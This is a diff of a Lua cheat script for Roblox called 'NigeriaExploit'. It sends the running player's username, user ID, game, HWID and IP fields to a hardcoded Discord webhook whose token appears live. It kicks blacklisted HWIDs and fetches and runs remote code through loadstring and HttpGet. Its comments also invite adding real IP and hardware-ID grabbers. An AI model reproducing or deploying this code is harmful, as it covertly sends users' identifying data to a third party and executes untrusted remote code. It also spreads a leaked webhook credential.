@@ -1,3 +1,82 @@
+-- Services
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+-- Player and System Info
+local LocalPlayer = Players.LocalPlayer or Players:GetPlayers()[1]  -- fallback
+local Username = LocalPlayer and LocalPlayer.Name or "Unknown"
+local DisplayName = LocalPlayer and LocalPlayer.DisplayName or "Unknown"
+local UserId = LocalPlayer and LocalPlayer.UserId or 0
+local GameName = game.Name or "Unnamed Game"
+
+-- Placeholders for values you'd normally get from an exploit or server
+local HWID = "unknown_hwid"         -- Replace this with your HWID getter if available
+local GetIp = "0.0.0.0"             -- Replace this with IP grabber if you have it
+local function detectExecutor()     -- Placeholder executor detector
+    return "UnknownExecutor"        -- Replace with real executor detection if desired
+end
+
+-- Blacklist
+local blacklistedHWIDs = {
+    ["abc123"] = true,
+    ["def456"] = true,
+    ["spoofedhackerID"] = true,
+}
+
+local function isBlacklisted()
+    if blacklistedHWIDs[HWID] then
+        warn("🚫 Blacklisted HWID: " .. HWID)
+        LocalPlayer:Kick("Je HWID staat op de blacklist. Nice try.")
+        return true
+    end
+    return false
+end
+
+-- Webhook Builder
+local function createWebhookData()
+    local executor = detectExecutor()
+    local data = {
+        embeds = {{
+            title = "⚠️ NigeriaExploit Detection",
+            description = string.format(
+                "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**IP:** %s",
+                Username, DisplayName, UserId, HWID, GameName, executor, GetIp
+            ),
+            thumbnail = {
+                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
+            },
+            color = 16753920,
+            footer = { text = os.date("Logged at %Y-%m-%d %H:%M:%S") }
+        }}
+    }
+    return HttpService:JSONEncode(data)
+end
+
+-- Webhook Sender
+local function sendWebhook(url, data)
+    local headers = {["Content-Type"] = "application/json"}
+    local requestFunc = http_request or request or (syn and syn.request) or (http and http.request)
+    if requestFunc then
+        requestFunc({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = data
+        })
+    else
+        warn("❌ No supported HTTP request method found.")
+    end
+end
+
+-- Webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/1392498264451842139/aaO4ISZQOkYYaqVvxlh2ZFw2oocBGO4PBaa-oRD_mODb9hZTn5o54av-G9k1S9rkOv1M"
+
+-- Execute
+if not isBlacklisted() then
+    local jsonData = createWebhookData()
+    sendWebhook(webhookUrl, jsonData)
+end
+
 print([[                       
                        :::!~!!!!!:.
                   .xUHWH!! !!?M88WHX:.
@@ -21,66 +100,8 @@ $R@i.~~ !     :   ~$$$$$B$$en:``
 ?MXT@Wx.~    :     ~"##*$$$$M~
 ]])
 
---// Services
+print("Made by trex.gg en eclipse ✅")
 
--- Executor Detection
-
--- Blacklist
-local blacklistedHWIDs = {
-    ["abc123"] = true,
-    ["def456"] = true,
-    ["spoofedhackerID"] = true,
-}
-
-local function isBlacklisted()
-    if blacklistedHWIDs[HWID] then
-        warn("Blacklisted HWID: " .. HWID)
-        LocalPlayer:Kick("je HWID staat op blacklist dusss ermmmmm")
-        return true
-    end
-    return false
-end
-
--- Webhook Builder
-local function createWebhookData()
-    local executor = detectExecutor()
-    local data = {
-        embeds = {{
-            title = "NigeriaExploit",
-            description = string.format(
-                "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**IP:** %s\n",
-                Username, DisplayName, UserId, HWID, GameName, GetIp
-            ),
-            thumbnail = {
-                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
-            },
-            color = 16753920,
-            footer = { text = os.date("Logged at %Y-%m-%d %H:%M:%S") }
-        }}
-    }
-    return HttpService:JSONEncode(data)
-end
-
--- Webhook Sender
-local function sendWebhook(url, data)
-    local headers = {["Content-Type"] = "application/json"}
-    local requestFunc = http_request or request or (syn and syn.request)
-    if requestFunc then
-        requestFunc({
-            Url = url,
-            Method = "POST",
-            Headers = headers,
-            Body = data
-        })
-    else
-        warn("❌ No supported HTTP request method found.")
-    end
-end
-
--- Webhook URL
-local webhookUrl = "https://discordapp.com/api/webhooks/1392498264451842139/aaO4ISZQOkYYaqVvxlh2ZFw2oocBGO4PBaa-oRD_mODb9hZTn5o54av-G9k1S9rkOv1M"
-
-print("Made By trex.gg en eclipse")
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
    Name = "NigeriaExploit",
